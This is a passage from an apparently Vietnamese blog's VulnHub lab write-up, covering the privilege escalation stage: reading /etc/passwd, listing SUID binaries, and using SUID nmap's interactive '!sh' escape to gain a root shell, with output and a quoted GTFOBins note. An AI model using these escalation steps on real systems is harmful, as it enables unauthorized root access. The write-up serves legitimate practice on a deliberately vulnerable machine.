+<h2 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h2><p>Lấy PTY rồi chuyển sang phiên của user robot.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">robot@linux:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:</span><br><span class="line">syslog:x:101:104::/home/syslog:/bin/false</span><br><span class="line">sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false</span><br><span class="line">bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false</span><br><span class="line">mysql:x:1001:1001::/home/mysql:</span><br><span class="line">varnish:x:999:999::/home/varnish:</span><br><span class="line">robot:x:1002:1002::/home/robot:</span><br></pre></td></tr></table></figure>
+<p>Nothing to do here. Tìm kiếm binary SUID xem sao.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">robot@linux:~$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/local/bin/nmap</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/pt_chown</span><br></pre></td></tr></table></figure>
+<p>Oay, có nmap kìa. Dễ rồi. (<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a>)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">robot@linux:~$ ls -al /usr/local/bin/nmap</span><br><span class="line">-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap</span><br><span class="line">robot@linux:~$ nmap --interactive</span><br><span class="line">nmap --interactive</span><br><span class="line"></span><br><span class="line">Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; for help</span><br><span class="line"><span class="meta prompt_">nmap&gt; </span><span class="language-bash">!sh</span></span><br><span class="line">!sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)</span><br></pre></td></tr></table></figure>
+<p>SUID cho phép người dùng khác có thể chạy file với quyền của owner, trong trường hợp này là root.<br>Tại sao lại dùng !sh thay vì dùng !bash?<br>Lần đầu tôi cũng dùng !bash, kiểm tra thì thấy vẫn là user robot. Vậy là tôi bị mất thời gian để đi tìm kiếm những cách khác để leo root. Cơ mà sau một hồi google và để ý lại doc trên trang gtfobins, thấy cái này.</p>
+<blockquote>
+<p>SUID<br>If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (&lt;&#x3D; Stretch) that allow the default sh shell to run with SUID privileges.<br>This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.</p>
+</blockquote>
+<p>Đuỵt moẹ! lại là câu chuyện của sh và bash và dash, xem ra Linux vẫn còn rất nhiều thứ cơ bản mà tôi cứ nghĩ là mình biết rồi…</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/write-up/" rel="tag"># write up</a>
+              <a href="/tags/medium/" rel="tag"># medium</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/02/01/vulnos2-vulnhub/" rel="prev" title="[VulnHub] VulnOS 2">
+                  <i class="fa fa-angle-left"></i> [VulnHub] VulnOS 2
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/02/03/dc9-vulnhub/" rel="next" title="[VulnHub] DC 9">
+                  [VulnHub] DC 9 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">minhnq22</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
